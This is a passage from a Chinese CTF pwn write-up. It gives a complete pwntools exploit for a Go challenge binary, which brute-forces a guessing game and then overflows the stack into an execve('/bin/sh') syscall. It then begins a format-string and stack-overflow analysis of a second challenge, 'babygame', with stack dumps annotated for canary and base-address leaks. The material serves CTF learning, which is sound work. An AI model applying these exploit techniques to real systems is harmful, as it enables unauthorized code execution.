这里必须要sleep一小会,不然就会发生错误</span></span><br><span class="line">	success(<span class="string">&quot;now is :&quot;</span>+<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D))</span><br><span class="line">	</span><br><span class="line">	recv = p.recv(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">if</span> recv[<span class="number">0</span>]==<span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">		success(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">	a = <span class="built_in">eval</span>(recv[<span class="number">0</span>])</span><br><span class="line">	b = <span class="built_in">eval</span>(recv[<span class="number">2</span>])</span><br><span class="line">	</span><br><span class="line">	success(<span class="string">&quot;A=&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;B=&quot;</span>+<span class="built_in">str</span>(b))</span><br><span class="line">	D=D+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> D==<span class="number">10</span>:</span><br><span class="line">		D=<span class="number">0</span></span><br><span class="line">		C=C+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> C==<span class="number">10</span>:</span><br><span class="line">		C=<span class="number">0</span></span><br><span class="line">		B=B+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> B==<span class="number">10</span>:</span><br><span class="line">		B=<span class="number">0</span></span><br><span class="line">		A=A+<span class="number">1</span>		</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> a==<span class="number">3</span>:</span><br><span class="line">		success(<span class="string">&quot;close.......&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> E==<span class="number">7</span>:</span><br><span class="line">		E=<span class="number">0</span></span><br><span class="line">		p.recvuntil(<span class="string">&#x27;TRY AGAIN?\n&#x27;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">		p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>接下来就进入这里了：（看上去像堆题）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">I THINK I SHOULD USE ANOTHER FAMILIAR THING TO KEEP YOU!!!!</span><br><span class="line">YOU HAVE FIVE CHOICE:</span><br><span class="line">(<span class="number">0</span>) INPUT</span><br><span class="line">(<span class="number">1</span>) OUTPUT</span><br><span class="line">(<span class="number">2</span>) EDIT</span><br><span class="line">(<span class="number">3</span>) CLEAR</span><br><span class="line">(<span class="number">4</span>) EXIT</span><br></pre></td></tr></table></figure>
<p>那个和我同期的兄弟发现了栈溢出，我想也没有更好的办法了（毕竟对golang的heap不熟悉）</p>
<p>选择“4”后，有一次输入的机会，不管输入什么都会触发“exit”，这也是最后的机会了，这里先直接挂代码把：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;(4) EXIT\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">_syscall_Syscall = <span class="number">0x47CF05</span></span><br><span class="line">binsh = <span class="number">0xc0000aa000</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>*<span class="number">0x8c</span> + p64(_syscall_Syscall) + p64(<span class="number">0</span>) + p64(<span class="number">59</span>) + p64(binsh) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ARE YOU SURE?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>假设输入只输入0x8c个“/bin/sh\x00”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x45c849</span>    syscall  &lt;SYS_exit_group&gt;</span><br><span class="line">       rdi: <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x0</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       r10: <span class="number">0x1</span></span><br><span class="line">  <span class="number">0x45c84b</span>    ret    </span><br><span class="line"></span><br><span class="line">  <span class="number">0x45c84c</span>    int3   </span><br><span class="line">  <span class="number">0x45c84d</span>    int3   </span><br><span class="line">  <span class="number">0x45c84e</span>    int3   </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s /bin/sh</span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b18</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b20</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b28</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b30</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">........</span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c430</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c438</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c440</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c448</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c450</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c458</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xc000045f78</span> —▸ <span class="number">0x43217c</span> ◂— xorps  xmm15, xmm15 <span class="comment">/* 栈顶 */</span></span><br></pre></td></tr></table></figure>
<p>可以发现：当前的栈顶（“ret”即将控制的区域）是可以控制的，直接在此写入“_syscall_Syscall”便可以控制IP指针并且进行系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="comment">/* &quot;0&quot;用于覆盖&quot;_syscall_Syscall&quot;的返回地址,&quot;59&quot;是execve的调用号,剩下的都是参数 */</span></span><br></pre></td></tr></table></figure>
<p> 完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;PLEASE INPUT A NUMBER:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1717986918</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;PLEASE INPUT A NUMBER:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1416925456</span>))</span><br><span class="line"></span><br><span class="line">A=<span class="number">0</span></span><br><span class="line">B=<span class="number">0</span></span><br><span class="line">C=<span class="number">0</span></span><br><span class="line">D=<span class="number">0</span></span><br><span class="line">E=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	E=E+<span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	payload=<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(<span class="number">0.001</span>)</span><br><span class="line">	success(<span class="string">&quot;now is :&quot;</span>+<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D))</span><br><span class="line">	</span><br><span class="line">	recv = p.recv(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">if</span> recv[<span class="number">0</span>]==<span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">		success(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">	a = <span class="built_in">eval</span>(recv[<span class="number">0</span>])</span><br><span class="line">	b = <span class="built_in">eval</span>(recv[<span class="number">2</span>])</span><br><span class="line">	</span><br><span class="line">	success(<span class="string">&quot;A=&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;B=&quot;</span>+<span class="built_in">str</span>(b))</span><br><span class="line">	D=D+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> D==<span class="number">10</span>:</span><br><span class="line">		D=<span class="number">0</span></span><br><span class="line">		C=C+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> C==<span class="number">10</span>:</span><br><span class="line">		C=<span class="number">0</span></span><br><span class="line">		B=B+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> B==<span class="number">10</span>:</span><br><span class="line">		B=<span class="number">0</span></span><br><span class="line">		A=A+<span class="number">1</span>		</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> a==<span class="number">3</span>:</span><br><span class="line">		success(<span class="string">&quot;close.......&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> E==<span class="number">7</span>:</span><br><span class="line">		E=<span class="number">0</span></span><br><span class="line">		p.recvuntil(<span class="string">&#x27;TRY AGAIN?\n&#x27;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">		p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b*0x45c849&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;(4) EXIT\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">_syscall_Syscall = <span class="number">0x47CF05</span></span><br><span class="line">binsh = <span class="number">0xc0000aa000</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">0x8c</span> + p64(_syscall_Syscall) + p64(<span class="number">0</span>) + p64(<span class="number">59</span>) + p64(binsh) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ARE YOU SURE?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>这个 GO 还是有点折磨的，在没有用插件的情况下，IDA上全是乱码（函数未重命名）很难识别，用了插件后，才勉强可以在网上搜索相关函数的信息</p>
<p>本题目很考验逆向基础，没有大型的加密解密，但IDA上的混淆还是很难受的</p>
<p>最后说一下我在复现过程中遇到的困难：</p>
<ul>
<li>GO本身的乱码（这个用插件可以解决大部分）</li>
<li>对于GO入口地址的探索：我刚开始以为GO的入口地址是 <code>main_main</code> ，发现断点不起作用后就无计可施了，最后我把几个和main有关的函数（ <code>main_init</code> ， <code>runtime_main</code> ）都打上断点，调试出了入口地址</li>
<li>绕过“1A2B游戏”：这个是最花时间的了，我光是看懂它的机制就耗了不少时间，期初我还在和搞算法的室友讨论怎么在7次之内求解，后来我发现随机数是不变的于是果断爆破，这个脚本我也弄了很久（有时候会有莫名其妙的错误导致爆破失败，最后加上sleep才解决了问题）</li>
<li>ret劫持的调试工作：这个就有点憋屈了，因为执行 exit 的时候程序会把我的 GDB 给掐掉，让我看不见栈上的数据，最后还是靠单步调试在执行 exit 前打断点，终于观察到了栈地址（似乎GO没有栈地址随机化）</li>
</ul>
<p>逆向能力对于pwn手来说真的很重要，以后也要多多训练逆向能力了…</p>
<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>刚开始拿到的文件其实是个压缩包，改后缀解压一下就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./babygame </span><br><span class="line">Welcome to HFCTF!</span><br><span class="line">Please input your name:</span><br><span class="line">ywx </span><br><span class="line">Hello, ywx</span><br><span class="line">�	</span><br><span class="line">Let<span class="number">&#x27;</span>s start to play a game!</span><br><span class="line"><span class="number">0.</span> rock</span><br><span class="line"><span class="number">1.</span> scissor</span><br><span class="line"><span class="number">2.</span> paper</span><br><span class="line">round <span class="number">1</span>:</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">babygame: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">50007</span>d900d58090aa96310390fcebd6350df9f31, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/babygame&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+104h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)())((<span class="keyword">char</span> *)&amp;init_s + <span class="number">1</span>))();</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HFCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x256</span>uLL);                      <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, name);</span><br><span class="line">  srand(seed);                                  <span class="comment">// 初始化种子</span></span><br><span class="line">  v6 = game();                                  <span class="comment">// 1/3 的概率返回 1</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</span><br><span class="line">    pwn();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck to you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);                                  <span class="comment">// 格式化漏洞</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>格式化字符串漏洞，好久都没有遇到了</p>
<p><strong>入侵思路</strong></p>
<p>有栈溢出，可以用来泄露“pro_base”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp   <span class="number">0x7ffe86861e08</span> —▸ <span class="number">0x558b6a2142e3</span> ◂— lea    rax, [rbp - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi   <span class="number">0x7ffe86861e10</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓          <span class="number">3</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│       <span class="number">0x7ffe86861e30</span> —▸ <span class="number">0x558b6a214180</span> ◂— endbr64 </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│       <span class="number">0x7ffe86861e38</span> ◂— <span class="number">0x65ed34df67df5f00</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│ rbp   <span class="number">0x7ffe86861e40</span> —▸ <span class="number">0x7ffe86861e60</span> —▸ <span class="number">0x7ffe86861f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7ffe86861e48</span> —▸ <span class="number">0x558b6a2143a6</span> ◂— mov    dword ptr [rbp - <span class="number">4</span>], eax</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7ffe86861e50</span> ◂— <span class="number">0x6a214180</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7ffe86861e58</span> ◂— <span class="number">0x7fef00000002</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│       <span class="number">0x7ffe86861e60</span> —▸ <span class="number">0x7ffe86861f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│       <span class="number">0x7ffe86861e68</span> —▸ <span class="number">0x558b6a214524</span> ◂— mov    dword ptr [rbx], eax</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7ffe86861e70</span> ◂— <span class="string">&#x27;aaaaaaaa\n\t&#x27;</span> <span class="comment">// input &#x27;a&#x27;*8</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7ffe86861e78</span> ◂— <span class="number">0x9800000090a</span> <span class="comment">/* &#x27;\n\t&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│       <span class="number">0x7ffe86861e80</span> ◂— <span class="number">0x98000000980</span></span><br><span class="line">... ↓          <span class="number">9</span> skipped</span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│       <span class="number">0x7ffe86861ed0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│       <span class="number">0x7ffe86861ed8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│       <span class="number">0x7ffe86861ee0</span> ◂— <span class="number">0x4000000000</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│       <span class="number">0x7ffe86861ee8</span> ◂— <span class="number">0x40000000200</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│       <span class="number">0x7ffe86861ef0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓          <span class="number">7</span> skipped</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│       <span class="number">0x7ffe86861f30</span> —▸ <span class="number">0x558b6a213040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│       <span class="number">0x7ffe86861f38</span> ◂— <span class="number">0xf0</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│       <span class="number">0x7ffe86861f40</span> ◂— <span class="number">0xc2</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│       <span class="number">0x7ffe86861f48</span> —▸ <span class="number">0x7ffe86861f77</span> ◂— <span class="number">0xed34df67df5f0000</span> </span><br><span class="line">    <span class="comment">/* 其实这里也可以leak stack_addr，但是为了覆盖seed就不能泄露这里了 */</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│       <span class="number">0x7ffe86861f50</span> —▸ <span class="number">0x7ffe86861f76</span> ◂— <span class="number">0x34df67df5f000000</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│       <span class="number">0x7ffe86861f58</span> —▸ <span class="number">0x558b6a2145bd</span> ◂— add    rbx, <span class="number">1</span> <span class="comment">// leak pro_base</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│       <span class="number">0x7ffe86861f60</span> —▸ <span class="number">0x7fefa87172e8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│       <span class="number">0x7ffe86861f68</span> —▸ <span class="number">0x558b6a214570</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│ rbx<span class="number">-4</span> <span class="number">0x7ffe86861f70</span> ◂— <span class="number">0x62381e44</span> <span class="comment">// canary</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│       <span class="number">0x7ffe86861f78</span> ◂— <span class="number">0x65ed34df67df5f00</span> <span class="comment">// canary</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│       <span class="number">0x7ffe86861f80</span> —▸ <span class="number">0x7ffe86862080</span> ◂— <span class="number">0x1</span> <span class="comment">// leak stack_addr</span></span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│       <span class="number">0x7ffe86861f88</span> —▸ <span class="number">0x558b6a214570</span> ◂— endbr64 </span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│       <span class="number">0x7ffe86861f90</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│     <span class="number">0x7ffe86861f98</span> —▸ <span class="number">0x7fefa854a0b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax <span class="comment">// leak libc_base</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│     <span class="number">0x7ffe86861fa0</span> —▸ <span class="number">0x7fefa8747620</span> (_rtld_global_ro) ◂— <span class="number">0x50d1300000000</span></span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│     <span class="number">0x7ffe86861fa8</span> —▸ <span class="number">0x7ffe86862088</span> —▸ <span class="number">0x7ffe86863393</span> ◂— <span class="string">&#x27;./babygame&#x27;</span></span><br><span class="line"><span class="number">35</span>:<span class="number">01</span>a8│     <span class="number">0x7ffe86861fb0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">36</span>:<span class="number">01b</span>0│     <span 